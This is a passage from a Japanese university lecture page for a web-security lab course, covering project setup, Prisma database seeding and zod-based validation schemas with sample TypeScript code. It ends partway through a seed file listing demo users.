<!DOCTYPE html>
<html lang="ja">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, user-scalable=yes"
    />
    <meta name="robots" content="noindex,nofollow,noarchive" />
    <meta name="referrer" content="no-referrer" />

    <script>
      MathJax = {
        chtml: {
          displayAlign: "left",
          displayIndent: "1em",
        },
      };
    </script>

    

    <link rel="icon" href="favicon.ico" sizes="any" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
      integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css?family=M+PLUS+Rounded+1c"
    />
    <link rel="stylesheet" href="style.css" />

    <title>4I-知能情報実験実習2</title>
  </head>

  <body>
    <div class="openbtn"><span></span><span></span><span></span></div>
    <nav id="g-nav">
      <div id="g-nav-list">
        <!-- ---------------------------------------- -->
         <ul>
<li><a href="#準備" id="toc-準備"><span class="toc-section-number">1</span> 準備</a>
<ul>
<li><a href="#演習-30分" id="toc-演習-30分"><span class="toc-section-number">1.1</span> 演習
<i class="fa-solid fa-stopwatch"></i>30分</a></li>
</ul></li>
<li><a href="#データベースについて" id="toc-データベースについて"><span
class="toc-section-number">2</span> データベースについて</a>
<ul>
<li><a href="#準備-1" id="toc-準備-1"><span class="toc-section-number">2.1</span> 準備</a></li>
<li><a href="#package.json-に追記" id="toc-package.json-に追記"><span
class="toc-section-number">2.2</span> package.json に追記</a></li>
<li><a href="#seed.ts-の作成" id="toc-seed.ts-の作成"><span class="toc-section-number">2.3</span>
seed.ts の作成</a></li>
<li><a href="#演習" id="toc-演習"><span class="toc-section-number">2.4</span> 演習</a></li>
<li><a href="#演習-1" id="toc-演習-1"><span class="toc-section-number">2.5</span> 演習</a></li>
</ul></li>
<li><a href="#zod-を利用した型定義やバリデーションについて"
id="toc-zod-を利用した型定義やバリデーションについて"><span class="toc-section-number">3</span> zod
を利用した型定義やバリデーションについて</a>
<ul>
<li><a href="#バリデーションスキーマの定義と型の自動生成"
id="toc-バリデーションスキーマの定義と型の自動生成"><span class="toc-section-number">3.1</span>
バリデーションスキーマの定義と型の自動生成</a></li>
<li><a href="#データのバリデーション" id="toc-データのバリデーション"><span
class="toc-section-number">3.2</span> データのバリデーション</a></li>
<li><a href="#データのバリデーション-シンプルな例"
id="toc-データのバリデーション-シンプルな例"><span class="toc-section-number">3.3</span>
データのバリデーション (シンプルな例)</a></li>
</ul></li>
<li><a href="#cookie-について" id="toc-cookie-について"><span class="toc-section-number">4</span>
Cookie について</a>
<ul>
<li><a href="#cookie-という仕組みが必要な理由" id="toc-cookie-という仕組みが必要な理由"><span
class="toc-section-number">4.1</span> Cookie という仕組みが必要な理由</a></li>
<li><a href="#cookie-の仕組み" id="toc-cookie-の仕組み"><span class="toc-section-number">4.2</span>
Cookie の仕組み</a></li>
<li><a href="#ウェブアプリ開発において-cookie-について知っておくべきこと"
id="toc-ウェブアプリ開発において-cookie-について知っておくべきこと"><span
class="toc-section-number">4.3</span> ウェブアプリ開発において Cookie
について知っておくべきこと</a></li>
<li><a href="#cookie-の属性設定" id="toc-cookie-の属性設定"><span
class="toc-section-number">4.4</span> Cookie の属性設定</a></li>
</ul></li>
<li><a href="#ニュースのコンテンツ" id="toc-ニュースのコンテンツ"><span
class="toc-section-number">5</span> 「ニュース」のコンテンツ</a>
<ul>
<li><a href="#クライアントサイド-フロントエンド-の処理"
id="toc-クライアントサイド-フロントエンド-の処理"><span class="toc-section-number">5.1</span>
クライアントサイド (フロントエンド) の処理</a></li>
<li><a href="#サーバサイド-バックエンド-の処理" id="toc-サーバサイド-バックエンド-の処理"><span
class="toc-section-number">5.2</span> サーバサイド (バックエンド) の処理</a></li>
<li><a href="#swr-について" id="toc-swr-について"><span class="toc-section-number">5.3</span> SWR
について</a></li>
</ul></li>
<li><a href="#ショップのコンテンツ" id="toc-ショップのコンテンツ"><span
class="toc-section-number">6</span> 「ショップ」のコンテンツ</a></li>
<li><a href="#xss脆弱性" id="toc-xss脆弱性"><span class="toc-section-number">7</span> XSS脆弱性</a>
<ul>
<li><a href="#cookie-が窃取されると" id="toc-cookie-が窃取されると"><span
class="toc-section-number">7.1</span> Cookie が窃取されると…</a></li>
<li><a href="#flask-python-などでもxss脆弱性に注意"
id="toc-flask-python-などでもxss脆弱性に注意"><span class="toc-section-number">7.2</span> Flask
(Python) などでもXSS脆弱性に注意</a></li>
</ul></li>
</ul> 
        <!-- ---------------------------------------- -->
      </div>
    </nav>

    <header class="markdown-body">
      <p>2025-4I 知能情報実験実習2 (前期) 講義資料</p>
      <p>毎週金曜日 1-4時限</p>
    </header>

    <main class="markdown-body">
      <!-- ---------------------------------------- -->
      <h1 data-number="1" id="準備"><span class="header-section-number">1</span> 準備</h1>
      <p>このテキストは、知能情報実験実習2 (前期) の「<strong>A班</strong>」の第5週目・05月23日 (金)
      の内容に関するものです。</p>
      <p><i class="fa-brands fa-github"></i><a
      href="https://github.com/TakeshiWada1980/web-sec-playground-1">こちら</a>
      のリポジトリのプロジェクト <code>web-sec-playground-1</code>
      を利用して、今週と来週で「<strong>ウェブアプリのセキュリティ</strong>」について体験的・実践的に学んでいきます。</p>
      <p>具体的には、次のような内容について学びます (次週に扱う内容も含んでいます) 。</p>
      <ul>
      <li>Cookie (クッキー)</li>
      <li>Prisma/DBの初期データ投入 (シーディング処理)</li>
      <li>zod (<a href="https://www.google.com/search?q=zodとは">バリデーションライブラリ</a>)</li>
      <li>XSS (クロスサイトスクリプティング) 攻撃</li>
      <li>SWR (<a href="https://swr.vercel.app/ja">データ取得のための React Hooks
      ライブラリ</a>)</li>
      <li>パスワードのハッシュ化</li>
      <li>Next.js ServerActions (Custom Invocation)</li>
      <li>セッションベース認証</li>
      <li>トークンベース認証 (JWT)</li>
      <li>CSRF (クロスサイトリクエストフォージェリ) 攻撃</li>
      </ul>
      <p>昨年度の<a
      href="https://takeshiwada1980.github.io/Programming3-2024/">プログラミング3</a>では<a
      href="https://supabase.com/">Supabase</a>が提供する「<strong>ユーザ認証機能</strong>」を利用してウェブアプリを開発しましたが、ここではセキュティに対する理解を深めるためにゼロからユーザ認証機能を実装していきます。</p>
      <h2 data-number="1.1" id="演習-30分"><span class="header-section-number">1.1</span> 演習
      <i class="fa-solid fa-stopwatch"></i>30分</h2>
      <p><a
      href="https://github.com/TakeshiWada1980/web-sec-playground-1">リポジトリ</a>をクローンして
      <code>README.md</code> に示す手順でプロジェクトをセットアップしてください。</p>
      <p>そして、実際にアプリの起動と操作、プログラムの読解を通じて<strong>ウェブアプリの「全体概要」を把握</strong>
      (＝フォルダ構成やプログラム内容をざっくりと把握) してください
      (AIも活用してください)。詳細な解説については、このあとで行ないますが、<strong>まずは自分自身で理解に努め、疑問点や不明点を整理して明確化しておくこと</strong>
      が効果的な学びにつながります。実際の開発においても「<strong>自分でコードを書くこと</strong>」よりも
      <span class="masked">「他人が書いたコードやAIが提案したコードを読解・評価すること」</span>
      のほうが圧倒的に多いです。</p>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>実際のソフトウェア開発では「自分でコードを書くこと
      (＝コーディング)」よりも、「他人が書いたコードあるいはAIが提案したコードを読解・評価すること
      (＝コードリーディング)」のほうが圧倒的に多い、と聞きました。本当ですか？</p>
      </blockquote>
      <p>基本的には、昨年度の<a
      href="https://takeshiwada1980.github.io/Programming3-2024/">プログラミング3</a>で学んだことが定着していれば、概ね理解できる内容となっています。</p>
      <p>以下の順序でプログラムや機能を理解・把握していくことを推奨します。ただし、あくまで目安であり、実際には
      <span class="masked">各ファイルを何度も往復しながら全体像を掴んでいく必要</span>
      があります。また、<strong>以下に示されている以外のファイルも必要に応じて参照</strong>
      していく必要があります。</p>
      <ol type="1">
      <li><strong>データベース</strong>
      <ul>
      <li><code>prisma/schema.prisma</code></li>
      <li><code>prisma/seed.ts</code></li>
      <li><code>src/app/_types/ApiResponse.ts</code></li>
      </ul></li>
      <li><strong>ニュース</strong> <code>http://localhost:3000/news</code>
      <ul>
      <li><code>src/app/news/page.tsx</code></li>
      <li><code>src/app/api/news/route.ts</code></li>
      </ul></li>
      <li><strong>ショップ</strong> <code>http://localhost:3000/shop</code>
      <ul>
      <li><code>src/app/shop/page.tsx</code></li>
      <li><code>src/app/_types/Product.ts</code></li>
      <li><code>src/app/api/productys/route.ts</code></li>
      <li><code>src/app/_types/CartItrem.ts</code></li>
      <li><code>src/app/api/cart/route.ts</code></li>
      </ul></li>
      <li><strong>ログイン</strong> <code>http://localhost:3000/login</code>
      <ul>
      <li>主に次週に扱う内容なので余裕があれば</li>
      </ul></li>
      <li><strong>サインイン</strong> <code>http://localhost:3000/signup</code>
      <ul>
      <li>主に次週に扱う内容なので余裕があれば</li>
      </ul></li>
      </ol>
      <p>なお、機能や設定を確認・把握するためにプログラムや設定を書き換える場合は、<strong>新たにブランチを切って、そこで編集するようにしてください</strong>。以降の説明
      (特に行番号) との不整合が生じるので、<code>main</code>
      ブランチでは内容の書き換えをしないでください。</p>
      <p><strong>▼ ブランチの新規作成と切り替え ▼</strong></p>
      <pre><code>git checkout -b sandbox
git commit --allow-empty -m &quot;Start sandbox branch&quot;</code></pre>
      <p>また <code>npx prisma studio</code> で「<strong>Prisma Studio</strong>」を起動し、DB
      の内容についても簡単に把握しておいてください。</p>
      <div class="note type-tips">
      <p><strong>ブランチの切り替え</strong></p>
      <p>演習が終わったあとは、以下の手順で <code>main</code> ブランチに戻っておいてください。</p>
      <pre><code>git commit -m &quot;Finish sandbox branch&quot; 
git checkout main  # mainブランチに戻る
git branch -D sandbox  # sandboxブランチの削除（必要に応じて）
npx prisma db seed</code></pre>
      <p>なお、ファイルを保存・コミットせずに <code>main</code>
      ブランチに切り替えると、作業中の変更がそのまま
      <code>main</code>ブランチに持ち越されることがあるので注意してください。</p>
      <p>また、DBの内容についても、以下のコマンで初期状態に戻しておいてください。</p>
      <pre><code>npx prisma db seed</code></pre>
      </div>
      <h1 data-number="2" id="データベースについて"><span class="header-section-number">2</span>
      データベースについて</h1>
      <p>このプロジェクトでは <code>npx prisma db seed</code>
      というコマンドを使って、<strong>データベースのレコードをクリアした上で、定義済みの初期データを挿入</strong>
      できるようにしています。このような処理は、一般に「<strong>シーディング
      (Seeding)</strong>」や「シード処理」「初期データ投入」と呼ばれます。</p>
      <p>なお、<code>npx prisma db seed</code> は、<code>npx prisma db push</code> や
      <code>npx prisma generate</code> のように Prisma が標準で提供しているコマンド
      (ビルトインコマンド) ではなく、以下のように <span
      class="masked">開発者が自分でスクリプトを用意し、設定することで使用可能になるカスタムコマンド</span>
      となっています。具体的には <code>package.json</code> の変更と <code>prisma/seed.ts</code>
      の作成が必要となります。</p>
      <h2 data-number="2.1" id="準備-1"><span class="header-section-number">2.1</span> 準備</h2>
      <p>ここからは <code>week-5</code>
      というブランチを新規作成して、そこで作業を行なってください。</p>
      <pre><code>git checkout main
git checkout -b week-5
git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
      <h2 data-number="2.2" id="package.json-に追記"><span class="header-section-number">2.2</span>
      package.json に追記</h2>
      <p>プロジェクトのルートにある <code>package.json</code> に次のようなコードを追記します。</p>
      <p><code>package.json</code>
      の役割や、以下のスクリプトで使用している「<code>ts-node</code>」については、PG3の授業で<a
      href="https://takeshiwada1980.github.io/Programming3-2024/lecture01.html#開発を効率的に行なうためのパッケージの追加">既に解説済み</a>です。</p>
      <div class="sourceCode" id="cb5" data-caption="package.json" data-startFrom="11"><pre
      class="sourceCode numberSource json numberLines"><code class="sourceCode json" style="counter-reset: source-line 10;"><span id="cb5-11"><a href="#cb5-11"></a><span class="er">&quot;prisma&quot;:</span> <span class="fu">{</span></span>
<span id="cb5-12"><a href="#cb5-12"></a>  <span class="dt">&quot;seed&quot;</span><span class="fu">:</span> <span class="st">&quot;ts-node --compiler-options {</span><span class="ch">\&quot;</span><span class="st">module</span><span class="ch">\&quot;</span><span class="st">:</span><span class="ch">\&quot;</span><span class="st">CommonJS</span><span class="ch">\&quot;</span><span class="st">} prisma/seed.ts&quot;</span></span>
<span id="cb5-13"><a href="#cb5-13"></a><span class="fu">}</span><span class="er">,</span></span></code></pre></div>
      <p>この設定により、ターミナルから <code>npx prisma db seed</code> を入力したときに
      <code>prisma/seed.ts</code> が<strong>単体で実行</strong>されるようになります。</p>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>Next.js 15 / TypeScript / Prisma でウェブアプリ開発をしています。いま
      <code>package.json</code>
      に以下の内容を追加するように指示されました。この設定の目的と動作について解説してください。</p>
      <pre><code>&quot;prisma&quot;: {
 &quot;seed&quot;: &quot;ts-node --compiler-options {\&quot;module\&quot;:\&quot;CommonJS\&quot;} prisma/seed.ts&quot;
},</code></pre>
      </blockquote>
      <h2 data-number="2.3" id="seed.ts-の作成"><span class="header-section-number">2.3</span>
      seed.ts の作成</h2>
      <p>データベースの「<strong>レコードのクリア処理</strong>」と「<strong>初期データの挿入処理</strong>」を、上記のスクリプトに対応させて
      <code>prisma/seed.ts</code> というファイルに記述します。</p>
      <p>このとき、<code>seed.ts</code>
      ファイルの配置場所には注意してください。もし、<code>src</code>
      フォルダ内に置いてしまうと<code>npm run dev</code> や <code>npm run build</code>
      を実行したときに、<strong><code>seed.ts</code>
      もビルド対象として処理されてしまう可能性</strong>
      があります。プロダクトにデータベースの初期化処理が含まれることは、<strong>セキュリティ上の重大なリスク</strong>となるので十分に注意してください。</p>
      <div class="note type-caution">
      <p><strong>seed.tsのインポート設定について</strong></p>
      <p><code>seed.ts</code> のなかで使用する <strong>自作のモジュール (型定義など)</strong>
      などは、必ず「<span
      class="masked">相対パス</span>」でインポートしてください。パスエイリアス（例：<code>@/app/_types/UserSeed</code>
      など）は利用できず、実行時にエラーが発生します。</p>
      </div>
      <h2 data-number="2.4" id="演習"><span class="header-section-number">2.4</span> 演習</h2>
      <p><code>prisma/seed.ts</code> のインポートを次のように書き換えると
      <code>npx prisma db seed</code>
      に「<strong>失敗すること</strong>」を確認してください。確認後は、元に戻してください。</p>
      <div class="sourceCode" id="cb7" data-caption="prisma/seed.ts (抜粋)" data-startFrom="5"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 4;"><span id="cb7-5"><a href="#cb7-5"></a><span class="im">import</span> { UserSeed<span class="op">,</span> userSeedSchema } <span class="im">from</span> <span class="st">&quot;@/app/_types/UserSeed&quot;</span><span class="op">;</span> <span class="co">// パスエイリアを使用</span></span></code></pre></div>
      <p>なお、上記でインポートされる <code>UserSeed.ts</code>
      のなかのインポートの記述についても「<strong>相対パス</strong>」で指定する必要があります。実際に、<code>UserSeed.ts</code>
      の <strong>第07行目</strong> を以下のように書き換えると <code>npx prisma db seed</code>
      に失敗することを確認してください。</p>
      <div class="sourceCode" id="cb8" data-caption="UserSeed.ts (抜粋)" data-startFrom="7"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 6;"><span id="cb8-7"><a href="#cb8-7"></a>} <span class="im">from</span> <span class="st">&quot;@/app/_types/CommonSchemas&quot;</span><span class="op">;</span> <span class="co">// パスエイリアを使用</span></span></code></pre></div>
      <p>確認後は、元に戻してください。</p>
      <h2 data-number="2.5" id="演習-1"><span class="header-section-number">2.5</span> 演習</h2>
      <p><code>newsItem</code>、<code>products</code>、<code>user</code>
      について、初期データをいくつか追加してみてください。追加後は
      <code>npx prisma db seed</code>、<code>npx prisma studio</code>
      を実行して内容を確認してください。</p>
      <h1 data-number="3" id="zod-を利用した型定義やバリデーションについて"><span
      class="header-section-number">3</span> zod を利用した型定義やバリデーションについて</h1>
      <p>シーディングに使用する <code>seed.ts</code> や、それに関連する型定義ファイル
      <code>UserSeed.ts</code> では、<strong>zod</strong> (ゾッド) という
      <strong>バリデーションライブラリ</strong> を積極的に使って <span
      class="masked">入力データの整合性を厳密に検証する設計</span> となっています。</p>
      <p><a
      href="https://www.google.com/search?q=zodとは">zod</a>は、TypeScriptにおいて「型定義」と「バリデーション（入力値検証）」を同時に記述できるライブラリです。TypeScriptでは、変数やオブジェクトに対して「<strong>数値型（number型）</strong>」や「<strong>文字列型（string型）</strong>」などの基本的な「型」の指定は可能となっていますが、<span
      class="masked">「0以上100以下の整数値」や「5文字以上20文字以下の文字列」</span>
      のような細かな制約条件については <strong>開発者が独自にバリデーションロジック
      (入力値検証ロジック) を実装する必要があります</strong>。</p>
      <div class="note type-caution">
      <p><strong>バリデーション (入力値検証) の重要性</strong></p>
      <p>ウェブアプリ開発においては、特に「テキストボックスなどを使ったユーザからの入力データ」と「HTTPリクエスト/レスポンスのボディデータ」に関して、セキュリティ上の観点から
      <strong>「悪意ある値」や「不正な値」である可能性も十分に予見して安全に取り扱うこと</strong>
      が求められます。</p>
      <p>このような場面において、バリデーション (入力値検証) の処理が重要となってきます。</p>
      </div>
      <p>バリデーション処理は、自分でロジックを書くこともできますが、zod
      を利用すれば複雑な処理も極めて簡潔に記述することができます。さらに zod
      では、<strong>スキーマ</strong> (＝ <span
      class="masked">入力データが満たすべき制約条件や構造を定義したもの</span>)
      から自動的に「<strong>TypeScriptの型定義</strong>」を生成する機能も利用可能となっています。</p>
      <div class="sourceCode" id="cb9"
      data-caption="スキーマから型を生成する例 (src/app/_types/CartItem.ts)"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript"><span id="cb9-1"><a href="#cb9-1"></a><span class="im">import</span> { z } <span class="im">from</span> <span class="st">&quot;zod&quot;</span><span class="op">;</span> <span class="co">// zodライブラリのインポート</span></span>
<span id="cb9-2"><a href="#cb9-2"></a></span>
<span id="cb9-3"><a href="#cb9-3"></a><span class="co">// バリデーションスキーマ（データが満たすべき制約条件や構造を定義）</span></span>
<span id="cb9-4"><a href="#cb9-4"></a><span class="im">export</span> <span class="kw">const</span> cartItemSchema <span class="op">=</span> z<span class="op">.</span><span class="fu">object</span>({</span>
<span id="cb9-5"><a href="#cb9-5"></a>  productId<span class="op">:</span> z<span class="op">.</span><span class="fu">string</span>()<span class="op">.</span><span class="fu">min</span>(<span class="dv">1</span>)<span class="op">,</span> <span class="co">// 1文字以上の「文字列」</span></span>
<span id="cb9-6"><a href="#cb9-6"></a>  quantity<span class="op">:</span> z<span class="op">.</span><span class="fu">number</span>()<span class="op">.</span><span class="fu">int</span>()<span class="op">.</span><span class="fu">min</span>(<span class="dv">0</span>)<span class="op">,</span> <span class="co">// 0以上の「整数値」</span></span>
<span id="cb9-7"><a href="#cb9-7"></a>})<span class="op">;</span></span>
<span id="cb9-8"><a href="#cb9-8"></a></span>
<span id="cb9-9"><a href="#cb9-9"></a><span class="co">// バリデーションスキーマをもとに「CartItem型」を生成</span></span>
<span id="cb9-10"><a href="#cb9-10"></a><span class="im">export type</span> CartItem <span class="op">=</span> z<span class="op">.</span><span class="at">infer</span><span class="op">&lt;</span><span class="kw">typeof</span> cartItemSchema<span class="op">&gt;;</span></span></code></pre></div>
      <p>また、zod は、クライアントサイドにおいて <strong>フォーム入力</strong>
      (<code>react-hook-form</code> の <code>useForm</code>)
      とも連携して強力なバリデーション機能を提供してくれます。以下、<code>react-hook-form</code> と
      <code>zod</code>
      を組み合わせて作成した入力フォームの例です。このプロジェクトにおいては、ログイン機能
      (<code>/login</code>) や サインイン機能 (<code>/signup</code>) のなかで利用しています。</p>
      <figure>
      <img src="figs/01/zod-01.png" alt="zod" />
      <figcaption aria-hidden="true">zod</figcaption>
      </figure>
      <p>zod
      を積極活用することで「<strong>煩雑</strong>」かつ「<strong>コードの可読性を低下させる原因</strong>」となっていたバリデーションを
      <span class="masked">簡潔かつ確実に実装すること</span>
      が可能になります。実際に、開発現場においても、バリデーションライブラリとして zod
      は、かなり使用されています。</p>
      <p>以上のことから、このプロジェクトでも zod を積極的利用した実装をしています。</p>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>TypeScript による Next.js / React
      のウェブアプリの開発現場で、バリデーションライブラリとして「zodがよく使われている」って聞いたんだけどホント？嘘っぽくない？</p>
      </blockquote>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>Next.js / TypeScript
      でウェブアプリ開発をしています。データのバリデーションを実施すべきタイミングとは、どのような場面ですか。クライアントサイド
      (フロントエンド)、サーバサイド (バックエンド) のそれぞれについて教えてください。</p>
      </blockquote>
      <h2 data-number="3.1" id="バリデーションスキーマの定義と型の自動生成"><span
      class="header-section-number">3.1</span> バリデーションスキーマの定義と型の自動生成</h2>
      <p>このプロジェクトでは <code>prisma/seed.ts</code>
      に記述している「<strong>シーディング処理</strong>」においても、zod を積極活用しています。</p>
      <p>まず、<code>src/app/_types/CommonSchemas.ts</code> において、<code>UserSeed.ts</code>
      の他に、認証機能などに使用する型定義ファイル (<code>LoginRequest.ts</code> や
      <code>UserProfile.ts</code>) で共通利用する <strong>バリデーションスキーマ</strong>
      (＝入力データが満たすべき制約条件や構造を定義したもの) を以下のように定義しています。</p>
      <div class="sourceCode" id="cb10" data-caption="src/app/_types/CommonSchemas.ts"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript"><span id="cb10-1"><a href="#cb10-1"></a><span class="im">import</span> { z } <span class="im">from</span> <span class="st">&quot;zod&quot;</span><span class="op">;</span></span>
<span id="cb10-2"><a href="#cb10-2"></a><span class="im">import</span> { Role } <span class="im">from</span> <span class="st">&quot;./Role&quot;</span><span class="op">;</span></span>
<span id="cb10-3"><a href="#cb10-3"></a></span>
<span id="cb10-4"><a href="#cb10-4"></a><span class="im">export</span> <span class="kw">const</span> passwordSchema <span class="op">=</span> z<span class="op">.</span><span class="fu">string</span>()<span class="op">.</span><span class="fu">min</span>(<span class="dv">5</span>)<span class="op">;</span></span>
<span id="cb10-5"><a href="#cb10-5"></a><span class="im">export</span> <span class="kw">const</span> emailSchema <span class="op">=</span> z<span class="op">.</span><span class="fu">string</span>()<span class="op">.</span><span class="fu">email</span>()<span class="op">;</span></span>
<span id="cb10-6"><a href="#cb10-6"></a><span class="im">export</span> <span class="kw">const</span> userNameSchema <span class="op">=</span> z<span class="op">.</span><span class="fu">string</span>()<span class="op">.</span><span class="fu">min</span>(<span class="dv">1</span>)<span class="op">;</span></span>
<span id="cb10-7"><a href="#cb10-7"></a><span class="im">export</span> <span class="kw">const</span> roleSchema <span class="op">=</span> z<span class="op">.</span><span class="fu">nativeEnum</span>(Role)<span class="op">;</span></span>
<span id="cb10-8"><a href="#cb10-8"></a></span>
<span id="cb10-9"><a href="#cb10-9"></a><span class="co">// prettier-ignore</span></span>
<span id="cb10-10"><a href="#cb10-10"></a><span class="im">export</span> <span class="kw">const</span> isUUID <span class="op">=</span> (value<span class="op">:</span> <span class="dt">string</span>) <span class="kw">=&gt;</span> <span class="ss">/</span><span class="sc">^[0-9a-f]{8}</span><span class="ss">-</span><span class="sc">[0-9a-f]{4}</span><span class="ss">-4</span><span class="sc">[0-9a-f]{3}</span><span class="ss">-</span><span class="sc">[89ab][0-9a-f]{3}</span><span class="ss">-</span><span class="sc">[0-9a-f]{12}$</span><span class="ss">/i</span><span class="op">.</span><span class="fu">test</span>(value)<span class="op">;</span></span>
<span id="cb10-11"><a href="#cb10-11"></a></span>
<span id="cb10-12"><a href="#cb10-12"></a><span class="im">export</span> <span class="kw">const</span> uuidSchema <span class="op">=</span> z<span class="op">.</span><span class="fu">string</span>()<span class="op">.</span><span class="fu">refine</span>(isUUID<span class="op">,</span> {</span>
<span id="cb10-13"><a href="#cb10-13"></a>  message<span class="op">:</span> <span class="st">&quot;Invalid UUID format.&quot;</span><span class="op">,</span></span>
<span id="cb10-14"><a href="#cb10-14"></a>})<span class="op">;</span></span></code></pre></div>
      <p><code>CommonSchemas.ts</code> の <strong>第10行目</strong>
      では、正規表現を使用してUUIDの形式 ( 16進数による
      <code>00000000-0000-0000-0000-000000000000</code> 形式)
      をチェックするカスタムバリデーションスキーマを定義しています。なお、正規表現はプログラミング1で<a
      href="https://takeshiwada1980.github.io/Programming1-2024/lecture27.html#正規表現">既に学習済み</a>です。</p>
      <p>次に、以下に示す <code>UserSeed.ts</code>
      において、それらのバリデーションスキーマを参照して、<code>userSeedSchema</code>
      を定義し、それを利用して <strong>第16行目</strong>
      <code>z.infer&lt;typeof userSeedSchema&gt;</code> により <code>UserSeed</code>
      型を自動生成しています。</p>
      <div class="sourceCode" id="cb11" data-caption="src/app/_types/UserSeed.ts"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript"><span id="cb11-1"><a href="#cb11-1"></a><span class="im">import</span> { z } <span class="im">from</span> <span class="st">&quot;zod&quot;</span><span class="op">;</span></span>
<span id="cb11-2"><a href="#cb11-2"></a><span class="im">import</span> {</span>
<span id="cb11-3"><a href="#cb11-3"></a>  userNameSchema<span class="op">,</span></span>
<span id="cb11-4"><a href="#cb11-4"></a>  emailSchema<span class="op">,</span></span>
<span id="cb11-5"><a href="#cb11-5"></a>  passwordSchema<span class="op">,</span></span>
<span id="cb11-6"><a href="#cb11-6"></a>  roleSchema<span class="op">,</span></span>
<span id="cb11-7"><a href="#cb11-7"></a>} <span class="im">from</span> <span class="st">&quot;./CommonSchemas&quot;</span><span class="op">;</span></span>
<span id="cb11-8"><a href="#cb11-8"></a></span>
<span id="cb11-9"><a href="#cb11-9"></a><span class="im">export</span> <span class="kw">const</span> userSeedSchema <span class="op">=</span> z<span class="op">.</span><span class="fu">object</span>({</span>
<span id="cb11-10"><a href="#cb11-10"></a>  name<span class="op">:</span> userNameSchema<span class="op">,</span></span>
<span id="cb11-11"><a href="#cb11-11"></a>  email<span class="op">:</span> emailSchema<span class="op">,</span></span>
<span id="cb11-12"><a href="#cb11-12"></a>  password<span class="op">:</span> passwordSchema<span class="op">,</span></span>
<span id="cb11-13"><a href="#cb11-13"></a>  role<span class="op">:</span> roleSchema<span class="op">,</span></span>
<span id="cb11-14"><a href="#cb11-14"></a>})<span class="op">;</span></span>
<span id="cb11-15"><a href="#cb11-15"></a></span>
<span id="cb11-16"><a href="#cb11-16"></a><span class="im">export type</span> UserSeed <span class="op">=</span> z<span class="op">.</span><span class="at">infer</span><span class="op">&lt;</span><span class="kw">typeof</span> userSeedSchema<span class="op">&gt;;</span></span></code></pre></div>
      <p>なお、ここではオブジェクトの各プロパティ (<code>name</code> や <code>email</code>)
      に独立したバリデーションスキーマを設定していますが、zod
      では<strong>複数のプロパティを参照した複合的なバリデーション</strong>
      (クロスフィールドバリデーション) や、条件分岐を伴う複雑なバリデーションも可能です。</p>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>バリデーションライブラリである「zod」では、オブジェクトを構成する複数のプロパティを参照した複合的なバリデーションや、条件分岐による複雑なバリデーションも可能であると聞きました。具体的にどのようなバリデーションが可能なのか丁寧に教えてください。</p>
      </blockquote>
      <h2 data-number="3.2" id="データのバリデーション"><span
      class="header-section-number">3.2</span> データのバリデーション</h2>
      <p><code>prisma/seed.ts</code> では、以下に示すように、</p>
      <ol type="1">
      <li>テスト用のユーザの種となる <code>userSeeds</code> を作成
      (<strong>第13行目</strong>から<strong>第38行目</strong>) して、</li>
      <li>zod によるバリデーションで <strong>データ形式や制約条件を満たしていることを確認</strong>
      (<strong>第41行目</strong>から<strong>第58行目</strong>) したうえで、</li>
      <li>DBに投入 (<strong>第70行目</strong>から<strong>第78行目</strong>)</li>
      </ol>
      <p>… しています。</p>
      <div class="sourceCode" id="cb12" data-caption="prisma/seed.ts (抜粋)" data-startFrom="9"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 8;"><span id="cb12-9"><a href="#cb12-9"></a><span class="kw">async</span> <span class="kw">function</span> <span class="fu">main</span>() {</span>
<span id="cb12-10"><a href="#cb12-10"></a>  <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;Seeding database...&quot;</span>)<span class="op">;</span></span>
<span id="cb12-11"><a href="#cb12-11"></a></span>
<span id="cb12-12"><a href="#cb12-12"></a>  <span class="co">// テスト用のユーザ情報の「種」となる userSeeds を作成</span></span>
<span id="cb12-13"><a href="#cb12-13"></a>  <span class="kw">const</span> userSeeds<span class="op">:</span> UserSeed[] <span class="op">=</span> [</span>
<span id="cb12-14"><a href="#cb12-14"></a>    {</span>
<span id="cb12-15"><a href="#cb12-15"></a>      name<span class="op">:</span> <span class="st">&quot;高負荷 耐子&quot;</span><span class="op">,</span></span>
<span id="cb12-16"><a href="#cb12-16"></a>      password<span class="op">:</span> <span class="st">&quot;password1111&quot;</span><span class="op">,</span></span>
<span id="cb12-17"><a href="#cb12-17"></a>      email<span class="op">:</span> <span class="st">&quot;admin01@example.com&quot;</span><span class="op">,</span></span>
<span id="cb12-18"><a href="#cb12-18"></a>      role<span class="op">:</span> Role<span class="op">.</span><span class="at">ADMIN</span><span class="op">,</span></span>
<span id="cb12-19"><a href="#cb12-19"></a>    }<span class="op">,</span></span>
<span id="cb12-20"><a href="#cb12-20"></a>    {</span>
<span id="cb12-21"><a href="#cb12-21"></a>      name<span class="op">:</span> <span class="st">&quot;不具合 直志&quot;</span><span class="op">,</span></span>
<span id="cb12-22"><a href="#cb12-22"></a>      password<span class="op">:</span> <span class="st">&quot;password2222&quot;</span><span class="op">,</span></span>
<span id="cb12-23"><a href="#cb12-23"></a>      email<span class="op">:</span> <span class="st">&quot;admin02@example.com&quot;</span><span class="op">,</span></span>
<span id="cb12-24"><a href="#cb12-24"></a>      role<span class="op">:</span> Role<span class="op">.</span><span class="at">ADMIN</span><span class="op">,</span></span>
